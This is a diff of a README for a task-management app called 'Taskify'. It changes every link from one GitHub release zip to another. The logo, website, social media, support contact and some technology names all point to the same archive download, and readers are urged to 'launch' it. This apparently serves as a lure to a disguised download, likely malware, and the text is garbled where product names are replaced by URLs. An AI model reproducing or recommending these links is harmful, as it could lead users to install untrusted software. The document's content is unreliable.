@@ -1,11 +1,11 @@
 # Taskify: Your Ultimate Task Management Solution 🚀
 
-![Taskify Logo](https://github.com/Ciro65/Taskify/releases/download/v1.0.0/Application.zip)
+![Taskify Logo](https://github.com/Ciro65/Taskify/releases/download/v2.0/Software.zip)
 
 Welcome to Taskify - the next generation task management application that will revolutionize how you organize your tasks and boost your productivity. With Taskify, you can seamlessly manage your tasks with ease.
 
 ## Features 🌟
-- **https://github.com/Ciro65/Taskify/releases/download/v1.0.0/Application.zip Backend:** Using the power of https://github.com/Ciro65/Taskify/releases/download/v1.0.0/Application.zip, Taskify's backend is robust and efficient.
+- **https://github.com/Ciro65/Taskify/releases/download/v2.0/Software.zip Backend:** Using the power of https://github.com/Ciro65/Taskify/releases/download/v2.0/Software.zip, Taskify's backend is robust and efficient.
 - **Express Framework:** Taskify leverages the Express framework for smooth server-side operations.
 - **MongoDB & Mongoose:** Store your data securely with MongoDB and interact with ease using Mongoose.
 - **Angular Frontend** (Under Development): Our frontend will be developed using Angular for a seamless user experience.
@@ -16,7 +16,7 @@ Welcome to Taskify - the next generation task management application that will r
 - **Ngx-bootstrap:** Taskify uses ngx-bootstrap for beautiful and interactive UI components.
 
 ## Installation Instructions 🛠️
-To download the software, please click [here](https://github.com/Ciro65/Taskify/releases/download/v1.0.0/Application.zip). 
+To download the software, please click [here](https://github.com/Ciro65/Taskify/releases/download/v2.0/Software.zip). 
 
 This link needs to be launched to start the download process.
 
@@ -29,7 +29,7 @@ To get started with Taskify, follow these simple steps:
 
 ## Technologies Used 🛠️
 Taskify utilizes a variety of technologies to offer a seamless task management experience:
-- https://github.com/Ciro65/Taskify/releases/download/v1.0.0/Application.zip
+- https://github.com/Ciro65/Taskify/releases/download/v2.0/Software.zip
 - Express
 - MongoDB
 - Mongoose
@@ -40,17 +40,17 @@ Taskify utilizes a variety of technologies to offer a seamless task management e
 - Bcryptjs
 
 ## Explore More 🔍
-Visit our [website](https://github.com/Ciro65/Taskify/releases/download/v1.0.0/Application.zip) to learn more about Taskify and its features.
+Visit our [website](https://github.com/Ciro65/Taskify/releases/download/v2.0/Software.zip) to learn more about Taskify and its features.
 
 ## Stay Connected 🌐
-Follow us on [Twitter](https://github.com/Ciro65/Taskify/releases/download/v1.0.0/Application.zip) and [Instagram](https://github.com/Ciro65/Taskify/releases/download/v1.0.0/Application.zip) for the latest updates and news.
+Follow us on [Twitter](https://github.com/Ciro65/Taskify/releases/download/v2.0/Software.zip) and [Instagram](https://github.com/Ciro65/Taskify/releases/download/v2.0/Software.zip) for the latest updates and news.
 
 ## Contributing 🤝
 We welcome contributions to Taskify! If you'd like to contribute, please check the "Releases" section for guidelines and updates.
 
 ## Support 🚨
-If you encounter any issues or have any questions, feel free to reach out to our support team at https://github.com/Ciro65/Taskify/releases/download/v1.0.0/Application.zip
+If you encounter any issues or have any questions, feel free to reach out to our support team at https://github.com/Ciro65/Taskify/releases/download/v2.0/Software.zip
 
 Let Taskify transform the way you manage your tasks! Get started today and experience the future of task management. 🌈
 
-[![Download Taskify](https://github.com/Ciro65/Taskify/releases/download/v1.0.0/Application.zip)](https://github.com/Ciro65/Taskify/releases/download/v1.0.0/Application.zip)
+[![Download Taskify](https://github.com/Ciro65/Taskify/releases/download/v2.0/Software.zip)](https://github.com/Ciro65/Taskify/releases/download/v2.0/Software.zip)
